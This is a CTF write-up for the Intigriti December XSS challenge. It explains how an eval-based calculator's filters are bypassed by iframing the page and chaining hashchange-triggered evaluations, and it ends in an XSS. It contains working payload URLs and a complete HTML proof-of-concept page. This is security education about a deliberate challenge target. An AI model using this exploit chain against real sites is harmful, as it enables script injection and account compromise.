---
layout: article
title:  "Intigrity December XSS Challenge"
image: /assets/intigriti-december-xss-challenge/cover.png
categories: ctf
tags: [ctf, xss, iframe, onhashchange]
assets: /assets/intigriti-december-xss-challenge/
---

*Using hashchange events to control a vulnerable page and escalate an otherwise
mostly harmless DOM XSS*

<!--more-->

![Cover]({{page.assets}}cover.png)

## tl;dr

For those already familiar with the challenge who just want a quick rundown of
the attack, I'll just quote the summary I included in my bug report on
Intigrity:

>
The `calc` function passes user input to `eval`, which allows an attacker to
execute simple javascript expressions as long as they satisfy the filers in
place. While a single `eval` can't do much because of those restrictions, it
can be used to first install an `onhashchange` handler. By iframing the page
and changing the hash, several simple expressions can be executed one after the
other, while preserving the context of the previous evaluations (there is no
page reload). Ultimately it can be used to execute arbitrary javascript.

## Recon

The target at
[https://challenge-1220.intigriti.io/](https://challenge-1220.intigriti.io/) is
a simple calculator.  As expected, it's controlled by clicking the buttons.
Doing so also injects query parameters into the current URL:

![Omnibox]({{page.assets}}omnibox.png)

Conversely, submitting those query parameters will result in the calculation
being performed. This is done entirely client-side by the following piece of
javascript:

```js
window.name = "Intigriti's XSS challenge";

const operators = ["+", "-", "/", "*", "="];
function calc(num1 = "", num2 = "", operator = ""){
  operator = decodeURIComponent(operator);
  var operation = `${num1}${operator}${num2}`;
  document.getElementById("operation").value = operation;
  if(operators.indexOf(operator) == -1){
    throw "Invalid operator.";
  }
  if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){
    throw "No special characters."
  }
  if(operation.length > 20){
    throw "Operation too long.";
  }
  return eval(operation);
}

function init(){
  try{
    document.getElementById("result").value = calc(getQueryVariable("num1"), getQueryVariable("num2"), getQueryVariable("operator"));
  }
  catch(ex){
    console.log(ex);
  }
}

function getQueryVariable(variable) {
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
    var vars = searchQueryString.split('&');
    var value;
    for (var i = 0; i < vars.length; i++) {
        var pair = vars[i].split('=');
        if (decodeURIComponent(pair[0]) == variable) {
            value = decodeURIComponent(pair[1]);
        }
    }
    return value;
}

/*
 The code below is calculator UI and not part of the challenge
*/

/* -- snip -- */
```

When the page loads, the `init` function is called. It calls
`getQueryVariable()` to extract `num1`, `num2` and `operator` from the URL, and
then passes them to the `calc` function. This function will eventually call
``eval(`${num1}${operator}${num2}`)`` if those parameters pass the following
sanity checks:

* `operator` is one of `+` `-` `/` `*` `=`
* `num1` is made only of letters, numbers and dash signs
* `num2` is made only of letters and numbers
* Those 3 strings concatenated don't exceed 20 characters


## Solving the challenge

### Simple assignments

It's quite clear from the code that the only way to get an XSS in through this
`eval` in the `calc` function. Nowhere else is there anything capable of
executing user-controlled expressions.

With the restrictions in place it is trivial to make an assignment. The following URL for example will execute `myvar=name`:

```
https://challenge-1220.intigriti.io/?num1=myvar&operator=%3d&num2=name
```

Not very useful but this is a start, and we can verify in the console that
`myvar` has been set:

![myvar]({{page.assets}}myvar.png)

### Banned characters

Armed with this, the idea would of course be to execute something like
`location=javascript:alert(document.domain)`. It could be done if we were able
to set `num2` to `javascript:alert(document.domain)`, but this would be blocked
first because of the filtered characters, and then because it exceeds the 20
chars limit.

Is there any other variable that we can control, that wouldn't be subject to
the same restrictions?

Something strange can be noticed in the `getQueryVariable` function: the search
query string that is extracted from the URL is stored in a global variable,
`searchQueryString`, for no reason; a local variable could be used instead:

```js
function getQueryVariable(variable) {
    window.searchQueryString = window.location.href.substr(window.location.href.indexOf("?") + 1, window.location.href.length);
```

As a result, if we used this URL:

```
https://challenge-1220.intigriti.io/?javascript:alert(document.domain)//&num1=location&operator=%3d&num2=searchQueryString
```

Then we would essentially make the page execute the following javascript:

```js
window.searchQueryString = "javascript:alert(document.domain)//&num1=location&operator=%3d&num2=searchQueryString";
eval("location=searchQueryString");
```

This payload only uses allowed characters in `num1`, `operator` and `num2`, yet
it executes an expression that can contain any banned character, like `:`, `(`
and `)`. Unfortunately the `location=searchQueryString` string is 26 characters
long, which exceeds the 20 char limit. We're not quite done yet.

### Be my puppet

Here comes the fun part. Early on I had the feeling that the only way to get to
the solution would be to call the `calc` function multiple times with different
payloads, since there didn't seem to be a way to do what we want with just one
`eval`, given the restrictions in place.

For the longest time I thought the key was to use the first `calc()` invocation
to set one of the window's event handler. We could either:

* Set it to `init` to get another go at `calc()` and its coveted `eval`. The
  problem is that without a way of changing the URL's query parameters between
rounds, it would just endlessly execute the same thing over and over again
every time the event pops.

* Or, set it to one of the button's event handler, which do modify the query
  parameters before calling `init` again. However it doesn't give us enough
control over the way the query parameters are modified.

So I was stuck, hopelessly and endlessly trying things that deep down I knew
would never work.

And then, it struck me. onhashchange.

When the hash portion of a URL is changed, the `hashchange` even is generated
but the page is not actually reloaded, since everything after the `#` is purely
client-side. Luckily, `getQueryVariable()` doesn't care about hash signs, so we
can put our entire query string behind a `#`. Our initial payload will install
the `init` function as the window's `onhashchange` event handler. Then if we
changed our payload in the hash portion of the URL, we would get another round
of execution with our new payload. Still in the same context, since there is no
reload.

Fortunately the web page doesn't have any framing protection. We can just
iframe it, and from our own page change the hash portion of the iframe's URL to
make it execute a payload of our choice. Each payload has to satisfy the sanity
checks in place, but we can chain as many as we want until we get the desired
result.  The iframe is our puppet and we're its master, making it execute a new
line of our malicious script with each hash change.

Here is the sequence of URLs we will use and, for each one, the piece of
javascript that we intend the iframe to execute:

1. `https://challenge-1220.intigriti.io/#?num1=onhashchange&operator=%3d&num2=init`
   ```js
eval("onhashchange=init");
```

1. `https://challenge-1220.intigriti.io/#?javascript:alert(document.domain)//&num1=x&operator=%3d&num2=searchQueryString`
   ```js
searchQueryString = "javascript:alert(document.domain)//&num1=x&operator=%3d&num2=searchQueryString";
eval("x=searchQueryString");
```

1. `https://challenge-1220.intigriti.io/#?num1=location&operator=%3d&num2=x`
   ```js
eval("location=x");
```

## Full PoC

Here is our malicious page:

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>
function setHash(hash) {
    frame.src = frame.src.split("#")[0] + "#" + hash
}

function pilot() {
    let hashes = [
        "?javascript:alert(document.domain)//&num1=x&operator=%3d&num2=searchQueryString",
        "?num1=location&operator=%3d&num2=x",
    ];
    for (let i = 0; i < hashes.length; i++) {
        // Chrome seems to do fine without it, but Firefox requires a small
        // delay after the hash has been set, to let the iframe run its
        // onhashchange handler
        setTimeout(() => { setHash(hashes[i]); }, i*100);
    }
}
</script>
</head>
<body>
<iframe id="frame" hidden onload="pilot()"
        src="https://challenge-1220.intigriti.io/#?num1=onhashchange&operator=%3d&num2=init">
</iframe>
</body>
</html>
```

I have a [PoC](https://acut3.xyz/intigriti-1220-ao56hrx42jg8/poc.html) online
if you want to give it a try.

Here are a few things to note:

* The hash changes are done in `pilot()`, which is called as the iframe's
  `onload` handler. This is to ensure we don't change the hash before the
initial page has been loaded completely.

* The hash is changed by changing the iframe's `src` attribute, and not it's
  `location`. Changing `frame.location` doesn't seem to fire the `onhashchange`
handler inside the iframe. If you know the reason for that, please let me know.

* The first hash change is done without any delay since we know the iframe is
  loaded completely. The second hash change is scheduled after a 100ms delay to
make sure the iframe's `onhashchange` handler has had time to do its job. This
is required on Firefox, which is is understandable, but for some reason Chrome
can execute the exploit reliably even without this delay. Not sure why.

## Final thoughts

A great challenge that showcases a beautiful way of escalating an otherwise
weak DOM XSS. This technique was new to me and required quite a few hours of
intense head scratching. Which of course made finding the solution even more
satisfying!

* * *
